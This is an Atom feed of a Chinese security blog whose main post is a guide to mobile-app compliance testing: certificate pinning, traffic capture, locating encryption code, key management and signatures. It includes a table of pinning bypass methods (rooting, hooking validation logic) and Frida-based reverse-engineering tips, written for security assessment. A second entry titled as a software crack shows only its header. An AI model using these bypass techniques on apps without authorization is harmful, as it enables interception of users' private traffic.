<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fancy&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://f4ncy.top/"/>
  <updated>2023-02-14T02:09:54.777Z</updated>
  <id>https://f4ncy.top/</id>
  
  <author>
    <name>fancy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>合规安全检测点经验分享</title>
    <link href="https://f4ncy.top/2023/02/14/SecurteDetection01/"/>
    <id>https://f4ncy.top/2023/02/14/SecurteDetection01/</id>
    <published>2023-02-13T18:02:52.000Z</published>
    <updated>2023-02-14T02:09:54.777Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="合规安全检测点经验分享"><a href="#合规安全检测点经验分享" class="headerlink" title="合规安全检测点经验分享"></a>合规安全检测点经验分享</h1><p>本次分享的检测点</p><ul><li>加密算法</li><li>密钥管理</li><li>完整性</li><li>抗抵赖</li><li>证书校验</li></ul><h1 id="通讯协议介绍及抓包"><a href="#通讯协议介绍及抓包" class="headerlink" title="通讯协议介绍及抓包"></a>通讯协议介绍及抓包</h1><pre><code>    App与服务器交互就会涉及到信息的交换，而信息的交互就必然需要一套完整的数据协议。通信协议就是双方用来完成通信或服务所必须遵循的规则和约定。App逆向过程需要获取通讯数据来对业务功能进行分析，而抓包就是通过一些手段来获取这些需要分析的通讯数据，对不同的通讯协议的抓包需要的工具和方法也不通。</code></pre><ul><li>Hook抓包<br>Hook抓包是指通过对发包函数（或对传输数据处理路径上的其他函数）进行Hook打印参数或返回结果的方式获取实际传输数据，以达到抓包的目的，常见于传输数据加密的情况。</li><li>通讯传输时抓包<br>使用抓包工具对通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与其直接对话，但事实上整个会话都被攻击者完全控制。</li></ul><h2 id="HTTPS协议抓包"><a href="#HTTPS协议抓包" class="headerlink" title="HTTPS协议抓包"></a>HTTPS协议抓包</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><pre><code>    超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。可以理解为一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。HTTP协议在通信过程使用明文传输client请求和server响应的报文。因此存在信息窃听、信息篡改和信息劫持的风险。因此诞生出了HTTPS协议，HTTPS基于HTTP协议。    HTTPS的安全基础是SSL/TLS。TLS 是介于TCP和HTTP之间的一层安全协议，不影响原有的TCP协议和HTTP协议，所以使用HTTPS基本上不需要对HTTP页面进行太多的改动。TLS为应用层提供安全服务，其目标是保证两个应用之间通信的保密性和可靠性,可在服务器和客户机两端同时实现支持。    服务端返回公钥是明文的，攻击者可以使用伪造的公钥与客户端进行交互，那么客户端如何保障通讯对象是合法的呢？这里就使用到了数字证书。</code></pre><p><img src="/2023/02/14/SecurteDetection01/Untitled.png" alt="Untitled"></p><p><strong>数字证书</strong></p><pre><code>    数字证书，这里指公钥证书 ( Public-Key Certificate, PKC) ，里面记有使用者的姓名、组织、邮箱地址等信息，以及属于此人的公钥，并由认证机构 (Certification Authority、 Certifying Authority, CA)施加数字签名 。</code></pre><p><strong>认证机构（CA）</strong></p><pre><code>    认证机构（CA）是数字证书认证中心的简称，是指发放、管理、废除数字证书的机构，CA的作用是检查证书持有者身份的合法性，并签发助手，以防证书被伪造或篡改，以及对证书和密钥进行管理：</code></pre><ul><li>生成密钥对</li><li>在注册公钥时对本人身份进行认证</li><li>生成并颁发证书</li><li>作废证书</li></ul><p><strong>证书链</strong></p><pre><code>    证书链是Root CA签发二级Intermediate CA，二级Intermediate CA可以签发三级Intermediate CA，也可以直接签发用户证书。从Root CA到用户证书之间构成了一个信任链：信任Root CA，就应该信任它所信任的二级Intermediate CA，从而就应该信任三级Intermediate CA，直至信任用户证书。</code></pre><p><img src="/2023/02/14/SecurteDetection01/Untitled%201.png" alt="Untitled"></p><p>服务端在发送明文公钥证书的情况下，客户端如何验证服务端的合法性呢？一般使用SSL pinning（证书绑定）的方式实现，这里提供两种方案：</p><ol><li>校验站点证书的唯一性：<blockquote><p>一般可以校验站点证书的公钥、指纹、文件哈希值</p></blockquote></li><li>校验上级证书的唯一性，另外校验站点证书的固定信息（在证书更新时不会变动的信息）<blockquote><p>由于站点证书的有效期较短，在更新证书后，使用第一种校验方案可能会导致旧版本的app无法正常使用，需要强制更新，为避免这种场景，需要一个时效长且有效的校验方案。首先校验根证书或中间证书的公钥、指纹、文件哈希值，根证书和中间证书的有效期较长（10-20年），可保障站点证书由可信CA颁发，之后再校验站点证书的域名、使用者信息等固定信息，可保障目标证书是由该CA颁发的指定站点证书。当然这种方案并不绝对安全，攻击者是可以通过向该CA购买证书，并将信息指定为App校验的信息，来绕过这种检测，但是需要增加攻击成本，权衡下我们认为这种方案是符合要求的。</p></blockquote></li></ol><p>这里给出对证书校验的几种策略：</p><table><thead><tr><th>安全等级</th><th>策略</th><th>信任范围</th><th>破解方法</th></tr></thead><tbody><tr><td>0</td><td>完全兼容策略</td><td>信任所有证书包括自签发证书</td><td>无需特殊操作</td></tr><tr><td>1</td><td>系统默认策略</td><td>信任系统或浏览器内置CA证书以及用户安装证书</td><td>设备安装代理证书</td></tr><tr><td>2</td><td>System ca pinning</td><td>只信任系统根证书，不信任用户安装的证书（Android 7.0后系统信任策略）</td><td>注入或root后将用户证书拷贝到系统证书目录</td></tr><tr><td>3</td><td>CA Pinning</td><td></td><td></td></tr><tr><td>Root(Intermediate) cert pinning</td><td>信任指定CA颁发的证书</td><td>hook注入等方式篡改验证逻辑</td><td></td></tr><tr><td>4</td><td>Leaf Cert pinning</td><td>信任指定站点证书</td><td>hook注入等方式篡改验证逻辑</td></tr><tr><td>如遇到双向锁定需要将App通讯证书导入到抓包工具</td><td></td><td></td><td></td></tr></tbody></table><h3 id="抓包流程"><a href="#抓包流程" class="headerlink" title="抓包流程"></a>抓包流程</h3><ul><li>burpsuite</li><li>charles</li><li>fiddler</li><li>whistle</li><li>…</li></ul><p>抓包配置见附件《抓包流程介绍-Android-屏蔽代理》、《抓包流程介绍-Android》、《抓包流程介绍-iOS》</p><p><strong>可能遇到的错误1</strong></p><p>设备设置代理后，发现无法正常访问，在抓包工具中会看到如下信息：</p><p><img src="/2023/02/14/SecurteDetection01/Untitled%202.png" alt="Untitled"></p><p>需要设备信任抓包工具证书。</p><p><strong>可能遇到的错误2</strong></p><p>完成对抓包工具的信任后，会发现部分app能够正常抓取通讯数据，但是仍然有部分app存在报错：</p><p><img src="/2023/02/14/SecurteDetection01/Untitled%203.png" alt="Untitled"></p><p>这种情况一般就是app内存在对SSL证书的校验了，抓包工具在与app通讯前会使用请求目标站点的站点证书信息，使用自己的根证书颁发一个伪造站点证书用于与app的通讯。那么伪造证书和真实证书之间的差异就是check的目标了。</p><p>解决方式：</p><ul><li>消除证书差异；（证书私钥泄露等一般无法实现）</li><li>绕过check过程；（见上文证书校验策略里的破解方法）</li></ul><h3 id="常见的HTTP组件的SSL-pinning方法"><a href="#常见的HTTP组件的SSL-pinning方法" class="headerlink" title="常见的HTTP组件的SSL pinning方法"></a>常见的HTTP组件的SSL pinning方法</h3><p><strong>Android</strong></p><p>Android开发中会使用谷歌官方提供的HTTP通讯组件或其他第三方的开源组件。常见的组件有httpURLConnection、httpClient、Okhttp3\Retrofit等。</p><p><strong>HttpURLConnection</strong></p><p>HttpURLConnection是Android自带的HTTP网络通讯库。<br>其基本使用方法：<br>使用请求url新建一个URL对象，使用openConnection()函数获取一个HttpURLConnection实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(&#123;<span class="string">&quot;https://www.f4ncy.top&quot;</span>)</span><br><span class="line">HttpURLConnection connection = (HttpURLConnection) url.openConnection();</span><br></pre></td></tr></table></figure><p><strong>SSL pinning with HttpUrlConnection</strong></p><p>通过HttpsURLConnection实例设置包含校验逻辑的SSLSocket来代替默认的SSLSocket。<br>SSLSokcet的创建一般通过获取SSLContext实例后，将实现SSL证书信息的证书管理器传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建SSLContext对象，并使用我们指定的信任管理器初始化 </span></span><br><span class="line">TrustManager[] tm = &#123; MyTrustManager()&#125;; <span class="comment">//实现证书信息校验的TrustManager</span></span><br><span class="line">SSLContext sslContext = SSLContext.getInstance(<span class="string">&quot;SSL&quot;</span>, <span class="string">&quot;SunJSSE&quot;</span>);<span class="comment">// (&quot;TLS&quot;); </span></span><br><span class="line">sslContext.init(<span class="keyword">null</span>, tm, <span class="keyword">new</span> java.security.SecureRandom()); </span><br><span class="line"><span class="comment">// 从上述SSLContext对象中得到SSLSocketFactory对象</span></span><br><span class="line">SSLSocketFactory ssf = sslContext.getSocketFactory(); </span><br><span class="line">HttpsURLConnectionconnection = (HttpsURLConnection) url.openConnection();</span><br><span class="line">connection.setSSLSocketFactory(ssf);</span><br></pre></td></tr></table></figure><p><strong>okhttp3</strong></p><p>Okhttp3是目前比较火的http客户端，用于android和java项目开发中的网络通讯组件。<br>Retrofit 是一个 RESTful 的 HTTP 网络请求框架的封装，网络请求的内部实现是以 OkHttp3 完成，而 Retrofit 仅负责网络请求接口的封装。</p><p>先创建一个okhttpClient对象，再创建一个Request对象，okhttpClient客户端将Request对象封装成Call对象后，就可以调用enqueue()函数发起一次网络请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder().xxx.build();</span><br><span class="line">okHttpClient.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SSL pinning with okhttp3</strong></p><p>Okhttp3的ssl绑定实现方式一般是通过添加拦截器的形式，在OkhttpClient初始化时可以设置是否代理、SSL验证、协议版本等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//方式一：绑定certificatePinner 实现简单</span></span><br><span class="line"></span><br><span class="line">CertificatePinner certificatePinner = <span class="keyword">new</span> CertificatePinner.Builder()</span><br><span class="line">         .add(<span class="string">&quot;api hostname&quot;</span>, <span class="string">&quot;sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;</span>)</span><br><span class="line">         .build();</span><br><span class="line">OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient.Builder().certificatePinner(certificatePinner).xxxxxxx.build();</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二：设置sslSocketFactory 校验方式较为灵活</span></span><br><span class="line">OkHttpClient build = <span class="keyword">new</span> OkHttpClient.Builder()</span><br><span class="line">.sslSocketFactory(getSocketFactory(), getX509TrustManager())</span><br><span class="line">.xxxxxxx.build();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> SSLSocketFactory <span class="title">getSocketFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Certificate generateCertificate = CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>).generateCertificate(your cert file);</span><br><span class="line">        KeyStore instance = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">        instance.load((InputStream) <span class="keyword">null</span>, (<span class="keyword">char</span>[]) <span class="keyword">null</span>);</span><br><span class="line">        instance.setCertificateEntry(<span class="string">&quot;ca&quot;</span>, generateCertificate);</span><br><span class="line">        TrustManagerFactory instance2 = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line">        instance2.init(instance);</span><br><span class="line">        TrustManager[] trustManagers = instance2.getTrustManagers();</span><br><span class="line">        SSLContext instance3 = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">        instance3.init((KeyManager[]) <span class="keyword">null</span>, trustManagers, <span class="keyword">new</span> SecureRandom());</span><br><span class="line">        <span class="keyword">return</span> instance3.getSocketFactory();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OkHttpClient okHttpClient = OkHttpClient.Builder()</span><br><span class="line">.newBuilder()</span><br><span class="line">.proxy(Proxy.NO_PROXY)<span class="comment">//屏蔽代理</span></span><br><span class="line">.xxxx</span><br><span class="line">.sslSocketFactory(getSocketFactory(), getX509TrustManager())</span><br><span class="line">.build();</span><br></pre></td></tr></table></figure><p><strong>iOS</strong></p><p><strong>AFNetwork</strong></p><ol><li>新建一个manager;</li><li>在mainBundle中找到证书文件https.cer, 并且将相关的数据读取出来;</li><li>新建一个AFSecurityPolicy，并进行相应的配置;</li><li>将这个AFSecurityPolicy 实例赋值给manager.</li></ol><blockquote><p>AFSSLPinningModeNone: 代表客户端无条件地信任服务器端返回的证书。<br>AFSSLPinningModePublicKey: 代表客户端会将服务器端返回的证书与本地保存的证书中，PublicKey的部分进行校验；如果正确，才继续进行。<br>AFSSLPinningModeCertificate: 代表客户端会将服务器端返回的证书和本地保存的证书中的所有内容，包括PublicKey和证书部分，全部进行校验；如果正确，才继续进行。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+ (AFSecurityPolicy*)customSecurityPolicy</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// /先导入证书</span></span><br><span class="line">    NSString *cerPath = [[NSBundle mainBundle] pathForResource:@<span class="string">&quot;certfile&quot;</span> ofType:@<span class="string">&quot;cer&quot;</span>];<span class="comment">//证书的路径</span></span><br><span class="line">    NSData *certData = [NSData dataWithContentsOfFile:cerPath];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// AFSSLPinningModeCertificate 使用证书验证模式</span></span><br><span class="line">    AFSecurityPolicy *securityPolicy = [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeCertificate];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// allowInvalidCertificates 是否允许无效证书（也就是自建的证书），默认为NO</span></span><br><span class="line">    <span class="comment">// 如果是需要验证自建证书，需要设置为YES</span></span><br><span class="line">    securityPolicy.allowInvalidCertificates = YES;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//validatesDomainName 是否需要验证域名，默认为YES；</span></span><br><span class="line">    <span class="comment">//假如证书的域名与你请求的域名不一致，需把该项设置为NO；如设成NO的话，即服务器使用其他可信任机构颁发的证书，也可以建立连接，这个非常危险，建议打开。</span></span><br><span class="line">    <span class="comment">//置为NO，主要用于这种情况：客户端请求的是子域名，而证书上的是另外一个域名。因为SSL证书上的域名是独立的，假如证书上注册的域名是www.google.com，那么mail.google.com是无法验证通过的；当然，有钱可以注册通配符的域名*.google.com，但这个还是比较贵的。</span></span><br><span class="line">    <span class="comment">//如置为NO，建议自己添加对应域名的校验逻辑。</span></span><br><span class="line">    securityPolicy.validatesDomainName = NO;</span><br><span class="line">    </span><br><span class="line">    securityPolicy.pinnedCertificates = @[certData];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> securityPolicy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">AFHTTPRequestOperationManager *mgr = [AFHTTPRequestOperationManager manager];</span><br><span class="line">mgr.responseSerializer = [AFHTTPResponseSerializer serializer];</span><br><span class="line">[mgr setSecurityPolicy:[self customSecurityPolicy]];</span><br></pre></td></tr></table></figure><p>对于自定义证书的验证，参考NSURLSession。</p><p><strong>NSURLSession</strong></p><p>该类通过<code>[[NSURLSessionDelegate URLSession:didReceiveChallenge:completionHandler:]](https://developer.apple.com/documentation/foundation/url_loading_system/handling_an_authentication_challenge/performing_manual_server_trust_authentication)</code><br>委派方法来实现证书验证回调：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)URLSession:(NSURLSession *)session didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge completionHandler:(<span class="keyword">void</span> (^)(NSURLSessionAuthChallengeDisposition, NSURLCredential * _Nullable))completionHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到远程证书</span></span><br><span class="line">    SecTrustRef serverTrust = challenge.protectionSpace.serverTrust;</span><br><span class="line">    SecCertificateRef certificate = SecTrustGetCertificateAtIndex(serverTrust, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//设置ssl policy来检测主域名</span></span><br><span class="line">    NSMutableArray *policies = [NSMutableArray array];</span><br><span class="line">    [policies addObject:(__bridge_transfer id)SecPolicyCreateSSL(<span class="keyword">true</span>, (__bridge CFStringRef)challenge.protectionSpace.host)];</span><br><span class="line">    <span class="comment">//验证服务器证书</span></span><br><span class="line">    SecTrustResultType result;</span><br><span class="line">    SecTrustEvaluate(serverTrust, &amp;result);</span><br><span class="line">    BOOL certificateIsValid = (result == kSecTrustResultUnspecified || result == kSecTrustResultProceed);</span><br><span class="line">    <span class="comment">//得到本地和远程证书data</span></span><br><span class="line">    NSData *remoteCertificateData = CFBridgingRelease(SecCertificateCopyData(certificate));</span><br><span class="line">    </span><br><span class="line">    NSString *pathToCer = [[NSBundle mainBundle] pathForResource:@<span class="string">&quot;certfile&quot;</span> ofType:@<span class="string">&quot;cer&quot;</span>];</span><br><span class="line">   </span><br><span class="line">    NSData *localCertificate = [NSData dataWithContentsOfFile:pathToCer];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//检查</span></span><br><span class="line">    <span class="keyword">if</span> ([remoteCertificateData isEqualToData:localCertificate] &amp;&amp; certificateIsValid) &#123;</span><br><span class="line">        NSURLCredential *credential = [NSURLCredential credentialForTrust:serverTrust];</span><br><span class="line">        completionHandler(NSURLSessionAuthChallengeUseCredential,credential);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        completionHandler(NSURLSessionAuthChallengeCancelAuthenticationChallenge,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其他</strong></p><p>其他关于HTTPS服务器信任评估方法可以参考apple官方文档：</p><p><a href="https://developer.apple.com/library/archive/technotes/tn2232/_index.html#//apple_ref/doc/uid/DTS40012884-CH1-SECCUSTOMIZEAPIS">Technical Note TN2232: HTTPS Server Trust Evaluation (apple.com)</a></p><p>当我们成功抓取到app通讯数据后，就可以分析其参数内容，了解各个功能的业务逻辑了。但是，我们发现有时抓取到的数据全部是加密的，那么分析前就需要了解其加密过程：</p><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><h2 id="类型介绍"><a href="#类型介绍" class="headerlink" title="类型介绍"></a>类型介绍</h2><p>对称加密</p><blockquote><p>目前主流对称加密算法：AES、SM4、3DES等</p></blockquote><blockquote><p>不安全的对称加密算法：RC4、DES等</p></blockquote><blockquote><p>不安全的加密模式：ECB模式</p></blockquote><p>非对称加密</p><blockquote><p>RSA、SM2等</p></blockquote><h2 id="加密代码定位方式"><a href="#加密代码定位方式" class="headerlink" title="加密代码定位方式"></a>加密代码定位方式</h2><ol><li>通过关键词定位<blockquote><p>例如URL、参数名称、函数名特征</p></blockquote> 首先需要判断该请求所在原生代码还是Webview，一般可以通过获取页面layout判断当前页面是原生页面还是webview。（adb shell dumpsys activity activities | grep mResumedActivit）<br> 对可能存在位置进行关键词搜索，如果是原生的，反编译apk后进行搜索，一般来说会在dex中或者资源文件中，如果搜不到可能进行了字符串加密，在so文件中的情况很少，开发者不太可能使用C/C++编写业务接口处理的代码，当然也有一些框架可能会使用脚本编写业务代码，并编译进so中；如果是H5的，需要判断是本地离线H5还是在线H5动态加载，可以通过hook webview的loadUrl函数获取加载的url（file://xxx、<a href="https://xxx/">https://xxx</a>）。对于离线的，有打包进apk和下载两种，打包进去的可以在assets目录下寻找html、js文件进行搜索，下载下来的可以在私有目录file或其他目录下搜索；在线H5的，一般通过抓包可以获取到具体url，在浏览器中访问下载。</li><li>上下文查找http构造链<br>如果遇到加密、混淆，无法通过关键词进行定位，需要逆向代码了解其HTTP请求具体代码，通过分析HTTP Request构造链来定位参数处理和url还原，一般对Response的处理也会在构造链完成后的调用代码的callback处。</li><li>通过堆栈记录寻找 使用profile、simpleperf等跟踪进场，通过记录某个接口事件（点击一次登录按钮）（尽可能缩短记录的执行窗口，避免trace过大，增大分析难度），在trace中搜索dofinal、encrypt、Base64、request等关键词进行定位，这种方式找到的目标点可能有很多，需要结合app代码和hook尝试来定位正确目标函数； 使用frida hook加密库的锚点函数，例如dofinal、javax.crypto.Cipher.getInstance，根据堆栈信息搜索可疑函数。</li><li>常见框架特征 柯蓝（包名为com.csii.xxx） 屹通（包名为com.yitong.xxx） mpaas TMF 例： 柯蓝AES（旧） com.csii.njaesencryption.PEJniLibRSA（加密工具类） libcsii_AESTelecomModule_v1_0.so（加密实现动态库） 生成AES随机密钥，<code>setNativeAesKeyMode</code>第一个参数为1，生成128位长度密钥，若为2，生成256位长度密钥。 <img src="/2023/02/14/SecurteDetection01/Untitled%204.png" alt="Untitled"> 数据加密使用CBC模式的AES加密算法： <img src="/2023/02/14/SecurteDetection01/Untitled%205.png" alt="Untitled"> test最终报文拼接 <img src="/2023/02/14/SecurteDetection01/Untitled%206.png" alt="Untitled"></li></ol><p>如何判断算法类型：</p><ol><li>常量参数，例如“AES/CBC/paddingmode”</li><li>函数符号</li><li>配置文件，部分框架会在特定的配置文件中设置加密算法类型</li><li>算法特征：特征值、密钥长度、密文长度<blockquote><p>AES密钥长度为128、192、256bit；3DES为168bit；SM4为128、256bit</p></blockquote><blockquote><p>例如AES加密中使用到的TBOX（查表法）中的常量：0xC66363A5等</p></blockquote></li><li>利用插件<blockquote><p>findcrypt3</p></blockquote></li></ol><p>密钥管理</p><ol><li>密钥生成<blockquote><p>要保证不同用户使用不同密钥加密，一般通过客户端本地随机生成密钥的方式实现，建议使用安全的随机数生成器，例如<strong>java.security.SecureRandom类</strong></p></blockquote></li><li>密钥传输<blockquote><p>客户端生成的对称密钥需要共享给服务端，服务端才能解密客户端请求的数据，并加密应答数据后返回给客户端。对称密钥如何安全地共享给服务端：<br> a. 使用非对称加密算法加密对称加密密钥；<br> b. 使用安全的密钥协商方式，例如Diffie-Hellman密钥交换。</p></blockquote></li><li>密钥保存<blockquote><p>对于数据通讯时使用的加密密钥，一般为一次一密或启动时生成密钥，这种情况下密钥是不需要落地存储的，在加密工具类中使用成员变量维持和传递即可；</p></blockquote><blockquote><p>对应本地数据存储时使用的加密密钥，由于其加解密逻辑均在本地实现，可通过逆向分析获取到密钥，此时需要安全的密钥保存方式，Android Keystore利用设备的可信任执行环境（TEE），开发者可以使用KeyStore API生成密钥、使用密钥签名、使用密钥加解密、获取密钥的属性信息，但无法将密钥本身从KeyStore中取出，密钥不会出现在应用进程。</p></blockquote></li></ol><h2 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h2><p>我们一般使用单向散列函数，也被称为消息摘要函数或哈希函数，来计算消息摘要，用于数据的完整性校验。</p><p>安全的散列函数应具备的性质：</p><ul><li>抗碰撞性。根据一个输入，找到一个其它输入得到相同的输出，在计算上是不可行的；</li><li>不可逆性。根据一个输出，找到一个输入其散列值等于输出，在计算上是不可行的，即不可能从结果逆向推导初始值。</li></ul><p>类型介绍</p><p>MD5、SHA-1、SHA-2、SHA-3、SM3</p><p>MD5以及SHA1的强抗碰撞性已被证明不满足。</p><h2 id="抗抵赖性"><a href="#抗抵赖性" class="headerlink" title="抗抵赖性"></a>抗抵赖性</h2><p>消息认证码（MAC）</p><pre><code>    由于单项散列函数仅能保证数据的的完整性，即数据在传输过程中没有被篡改，而无法证明数据是由正确的发送者发送，即无法做到对数据来源的认证。    消息认证码是在单项散列函数的基础上增加了加密函数，发送者和接收者共享一个密钥，在密钥保密的情况下，接收者可以验证数据来自于特定的发送者，且数据未被篡改。    但是由于发送者和接收者使用共享的密钥，即双方可以伪造对方的消息、否认自己的消息，对于资金交易等重要的消息，需要保障交易双方消息来源的合法性，这里使用到了数字签名技术。</code></pre><p>数字签名</p><pre><code>    数字签名就是利用了“没有私钥的人事实上无法生成使用该私钥所生成的密文”这一性质来实现。    数字证书基于公钥，其带有使用者的详细信息，并且其基于公钥基础设施（PKI）的架构，让其具有完善的管理体系，是目前来验证消息来源合法性的主要载体。（密钥的分发需要一个三方机构的参与，一般来说证书服务器充当了该场景下的CA）</code></pre><p><img src="/2023/02/14/SecurteDetection01/Untitled%207.png" alt="Untitled"></p><pre><code>    数字签名使用的算法有RSA、ElGamal、DSA、ECDSA、Rabin，RSA是目前数字签名中使用最普遍的算法。</code></pre><p>常见流程：</p><ol><li>客户端上送设备信息、用户信息向证书服务器获取随机数；</li><li>证书服务器返回随机数；</li><li>客户端上送随机数、设备信息、用户信息，交易服务器组装随机数和用户信息，并使用机构证书签名该数据；</li><li>客户端获取该签名结果，生成证书列表对象，并进行身份认证，通过后上送证书列表给对象证书服务器，证书服务器返回用户证书状态；</li><li>客户端根据返回状态判断是否具有证书，若无证书，则申请下载证书；</li><li>若有证书，客户端向交易服务器获取随机数，生成客户端随机数，收集交易信息传输给交易服务器，服务端组装交易报文，使用机构证书对报文进行签名；</li><li>客户端将交易报文和服务端返回的机构签名结果进行组装，使用个人证书对其签名（部分方案需要签名服务器与客户端进行协同签名）；</li><li>将签名结果与交易信息一同发送给证书服务端，证书服务端验证签名结果。</li></ol><p>引用：</p><p><a href="https://blog.csdn.net/qq_43589852/article/details/121457771">https://blog.csdn.net/qq_43589852/article/details/121457771</a></p><p><a href="https://zhuanlan.zhihu.com/p/440612523">https://zhuanlan.zhihu.com/p/440612523</a></p><p><a href="https://www.jianshu.com/p/4102b817ff2f">https://www.jianshu.com/p/4102b817ff2f</a></p><p>《图解密码技术》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Record It（ARM&amp;X86）crack</title>
    <link href="https://f4ncy.top/2023/01/06/RecordItcrack/"/>
    <id>https://f4ncy.top/2023/01/06/RecordItcrack/</id>
    <published>2023-01-05T22:15:06.000Z</published>
    <updated>2023-01-06T06:27:35.991Z</updated>
    
